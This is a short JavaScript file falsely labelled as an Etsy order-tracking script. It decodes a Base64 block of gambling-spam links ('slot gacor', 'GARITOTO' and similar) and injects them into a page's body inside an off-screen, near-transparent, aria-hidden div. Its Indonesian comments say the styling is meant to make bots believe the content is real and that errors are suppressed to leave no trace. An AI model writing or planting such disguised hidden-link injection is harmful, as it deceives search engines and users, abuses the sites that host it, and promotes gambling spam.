// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vdHJhdmVsLXN0b3JpZXMvIj5HQVJJVE9UTzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vdHJhdmVsLXN0b3JpZXMvIj5IT05EQSBUT1RPPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS90cmF2ZWwtc3Rvcmllcy8iPkdBUklUT1RPIHNsb3Q8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tL3RyYXZlbC1zdG9yaWVzLyI+R0FSSVRPVE8gbG9naW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tL3RyYXZlbC1zdG9yaWVzLyI+IEdBUklUT1RPIGRhZnRhcjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vdHJhdmVsLXN0b3JpZXMvIj5HQVJJVE9UTyBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS90cmF2ZWwtc3Rvcmllcy8iPkdBUklUT1RPIGxpbms8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tL3RyYXZlbC1zdG9yaWVzLyI+R0FSSVRPVE8gcnRwPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS90cmF2ZWwtc3Rvcmllcy8iPkdBUklUT1RPIGxpbmsgYWx0ZXJuYXRpZjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vdHJhdmVsLXN0b3JpZXMvIj5saW5rIEdBUklUT1RPPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS90cmF2ZWwtc3Rvcmllcy8iPnNpdHVzIEdBUklUT1RPPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS90cmF2ZWwtc3Rvcmllcy8iPnNpdHVzIGdhY29yIEdBUklUT1RPPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS90cmF2ZWwtc3Rvcmllcy8iPnNpdHVzIHNsb3QgR0FSSVRPVE88L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tL3RyYXZlbC1zdG9yaWVzLyI+c2xvdCBnYWNvciBHQVJJVE9UTzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vdHJhdmVsLXN0b3JpZXMvIj5zbG90IGdhY29yPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS90cmF2ZWwtc3Rvcmllcy8iPnNsb3QgamFja3BvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vdHJhdmVsLXN0b3JpZXMvIj5zbG90IG9ubGluZTwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vdHJhdmVsLXN0b3JpZXMvIj5zbG90IGRlbW88L2E+";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
